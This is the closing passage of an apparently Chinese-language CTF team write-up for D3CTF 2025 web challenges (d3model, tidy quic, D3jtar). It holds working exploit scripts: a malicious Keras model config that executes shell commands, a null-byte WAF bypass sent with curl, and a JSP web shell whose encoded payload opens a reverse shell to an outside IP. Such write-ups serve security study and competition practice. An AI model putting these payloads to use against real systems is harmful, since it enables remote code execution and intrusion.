class="string">&quot;args&quot;</span>:[[<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;env&gt;/app/index.html&quot;</span>]],<span class="string">&quot;kwargs&quot;</span>:&#123;<span class="string">&quot;bufsize&quot;</span>:-<span class="number">1</span>&#125;&#125;]</span><br><span class="line">        &#125;],</span><br><span class="line">            <span class="string">&quot;input_layers&quot;</span>:[[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]],</span><br><span class="line">            <span class="string">&quot;output_layers&quot;</span>:[[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_read:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zip_write:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> zip_read.infolist():</span><br><span class="line">            <span class="keyword">if</span> item.filename != <span class="string">&quot;config.json&quot;</span>:</span><br><span class="line">                zip_write.writestr(item, zip_read.read(item.filename))</span><br><span class="line"></span><br><span class="line">os.remove(model_name)</span><br><span class="line">os.rename(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>,model_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        zf.writestr(<span class="string">&quot;config.json&quot;</span>,json.dumps(config))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Malicious model ready&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>上传虽然会报错，但是依然是解析了的，刷新即可</p>
<h2><span id="tidy-quic">tidy quic</span><a href="#tidy-quic" class="header-anchor"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;bytes&quot;</span></span><br><span class="line">        <span class="string">&quot;errors&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/libp2p/go-buffer-pool&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/quic-go/quic-go/http3&quot;</span></span><br><span class="line">        <span class="string">&quot;io&quot;</span></span><br><span class="line">        <span class="string">&quot;log&quot;</span></span><br><span class="line">        <span class="string">&quot;net/http&quot;</span></span><br><span class="line">        <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var p pool.BufferPool</span><br><span class="line">var ErrWAF = errors.New(<span class="string">&quot;WAF&quot;</span>)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">        go func() &#123;</span><br><span class="line">                err := http.ListenAndServeTLS(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line">                log.Fatalln(err)</span><br><span class="line">        &#125;()</span><br><span class="line">        go func() &#123;</span><br><span class="line">                err := http3.ListenAndServeQUIC(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line">                log.Fatalln(err)</span><br><span class="line">        &#125;()</span><br><span class="line">        select &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> mux struct &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (*mux) ServeHTTP(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">        <span class="keyword">if</span> r.Method == http.MethodGet &#123;</span><br><span class="line">                _, _ = w.Write([]byte(<span class="string">&quot;Hello D^3CTF 2025,I&#x27;m tidy quic in web.&quot;</span>))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">                w.WriteHeader(<span class="number">400</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var buf []byte</span><br><span class="line">        length := <span class="built_in">int</span>(r.ContentLength)</span><br><span class="line">        <span class="keyword">if</span> length == -<span class="number">1</span> &#123;</span><br><span class="line">                var err error</span><br><span class="line">                buf, err = io.ReadAll(textInterrupterWrap(r.Body))</span><br><span class="line">                <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">                        <span class="keyword">if</span> errors.Is(err, ErrWAF) &#123;</span><br><span class="line">                                w.WriteHeader(<span class="number">400</span>)</span><br><span class="line">                                _, _ = w.Write([]byte(<span class="string">&quot;WAF&quot;</span>))</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">                                _, _ = w.Write([]byte(<span class="string">&quot;error&quot;</span>))</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                buf = p.Get(length)</span><br><span class="line">                defer p.Put(buf)</span><br><span class="line">                rd := textInterrupterWrap(r.Body)</span><br><span class="line">                i := <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> &#123;</span><br><span class="line">                        n, err := rd.Read(buf[i:])</span><br><span class="line">                        <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">                                <span class="keyword">if</span> errors.Is(err, io.EOF) &#123;</span><br><span class="line">                                        <span class="keyword">break</span></span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> errors.Is(err, ErrWAF) &#123;</span><br><span class="line">                                        w.WriteHeader(<span class="number">400</span>)</span><br><span class="line">                                        _, _ = w.Write([]byte(<span class="string">&quot;WAF&quot;</span>))</span><br><span class="line">                                        <span class="keyword">return</span></span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">                                        _, _ = w.Write([]byte(<span class="string">&quot;error&quot;</span>))</span><br><span class="line">                                        <span class="keyword">return</span></span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        i += n</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> !<span class="built_in">bytes</span>.HasPrefix(buf, []byte(<span class="string">&quot;I want&quot;</span>)) &#123;</span><br><span class="line">                _, _ = w.Write([]byte(<span class="string">&quot;Sorry I&#x27;m not clear what you want.&quot;</span>))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        item := <span class="built_in">bytes</span>.TrimSpace(<span class="built_in">bytes</span>.TrimPrefix(buf, []byte(<span class="string">&quot;I want&quot;</span>)))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bytes</span>.Equal(item, []byte(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">                _, _ = w.Write([]byte(os.Getenv(<span class="string">&quot;FLAG&quot;</span>)))</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                _, _ = w.Write(item)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> wrap struct &#123;</span><br><span class="line">        io.ReadCloser</span><br><span class="line">        ban []byte</span><br><span class="line">        idx <span class="built_in">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (w *wrap) Read(p []byte) (<span class="built_in">int</span>, error) &#123;</span><br><span class="line">        n, err := w.ReadCloser.Read(p)</span><br><span class="line">        <span class="keyword">if</span> err != nil &amp;&amp; !errors.Is(err, io.EOF) &#123;</span><br><span class="line">                <span class="keyword">return</span> n, err</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">                <span class="keyword">if</span> p[i] == w.ban[w.idx] &#123;</span><br><span class="line">                        w.idx++</span><br><span class="line">                        <span class="keyword">if</span> w.idx == <span class="built_in">len</span>(w.ban) &#123;</span><br><span class="line">                                <span class="keyword">return</span> n, ErrWAF</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        w.idx = <span class="number">0</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func textInterrupterWrap(rc io.ReadCloser) io.ReadCloser &#123;</span><br><span class="line">        <span class="keyword">return</span> &amp;wrap&#123;</span><br><span class="line">                rc, []byte(<span class="string">&quot;flag&quot;</span>), <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心代码如上，起初我看到这题，我以为要进行请求走私，一直在搜索这个框架有没有类似的NDAY然后再进行修改来绕过，但是没找到相关资料，我们的目标就是POST一个<code>I want flag</code>但是后续内容如果被提取成flag就会寄，测试发现用<code>\0</code>绕过即可，使用curl进行http3请求会比较方便，当然你也可以写python脚本，看自己选择了  <a href="https://curl.se/windows/">https://curl.se/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=$<span class="string">&#x27;I want \0flag&#x27;</span></span><br><span class="line">curl -X POST https://35.241.98.126:31956 -d <span class="string">&quot;<span class="variable">$x</span>&quot;</span> -v --insecure --http3 -H <span class="string">&quot;Content-Length: 11&quot;</span></span><br></pre></td></tr></table></figure>

<h2><span id="d3jtar">D3jtar</span><a href="#d3jtar" class="header-anchor"></a></h2><p>jtar解压时忽略了中文后的内容，因此使用以下exp完成</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://34.150.83.54:32217/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&lt;%@ page import=&quot;java.io.*&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">response.setContentType(&quot;text/html;charset=UTF-8&quot;);</span></span><br><span class="line"><span class="string">Process process = null;</span></span><br><span class="line"><span class="string">BufferedReader reader = null;</span></span><br><span class="line"><span class="string">String line = null;</span></span><br><span class="line"><span class="string">StringBuilder output = new StringBuilder();</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    process = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDkuMTUxLjE2OC82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span></span><br><span class="line"><span class="string">    reader = new BufferedReader(new InputStreamReader(process.getInputStream()));</span></span><br><span class="line"><span class="string">    while ((line = reader.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        output.append(line + &quot;\\n&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    process.waitFor();</span></span><br><span class="line"><span class="string">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="string">    output.append(&quot;Error executing command: &quot;).append(e.getMessage());</span></span><br><span class="line"><span class="string">&#125; finally &#123;</span></span><br><span class="line"><span class="string">    if (reader != null) &#123;</span></span><br><span class="line"><span class="string">        try &#123; reader.close(); &#125; catch (IOException e) &#123;&#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (process != null) &#123;</span></span><br><span class="line"><span class="string">        process.destroy();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">%&gt;</span></span><br><span class="line"><span class="string">&lt;%= output.toString() %&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    u = url + <span class="string">&quot;Upload&quot;</span></span><br><span class="line">    r = requests.post(u, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&quot;a.jsp耀&quot;</span>, payload)&#125;)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">page</span>):</span><br><span class="line">    u = url + <span class="string">&quot;view&quot;</span></span><br><span class="line">    r = requests.get(u, params=&#123;<span class="string">&#x27;page&#x27;</span>: page, <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;ls /&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tar</span>():</span><br><span class="line">    u = url + <span class="string">&quot;BackUp&quot;</span></span><br><span class="line">    r = requests.post(u, data=&#123;<span class="string">&quot;op&quot;</span>: <span class="string">&quot;tar&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untar</span>():</span><br><span class="line">    u = url + <span class="string">&quot;BackUp&quot;</span></span><br><span class="line">    r = requests.post(u, data=&#123;<span class="string">&quot;op&quot;</span>: <span class="string">&quot;untar&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = upload().split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line">tar()</span><br><span class="line">untar()</span><br><span class="line">view(r)</span><br></pre></td></tr></table></figure>

<p>解包的时候中文被忽略了，直接反弹shell</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2025 D3CTF SU WriteUp</p><p><a href="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/">https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2025-06-02</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-06-03</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/d3ctf/">d3ctf</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2025/01/20/2025-SUCTF-SU-%E5%AE%98%E6%96%B9WriteUp-Docker/"><span class="level-item">2025 SUCTF SU 官方WriteUp&amp;Docker</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1</span><span class="level-item">Misc</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">d3image</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">d3rpg-signin</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">d3RPKI</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2</span><span class="level-item">Crypto</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">d3fnv</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3</span><span class="level-item">Re</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">d3rpg-revenge</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">AliceInPuzzle</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4</span><span class="level-item">Web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">D3Invitation</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">d3model</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">tidy quic</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.4</span><span class="level-item">D3jtar</span></span></a></li></ul></li></ul></div></div><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>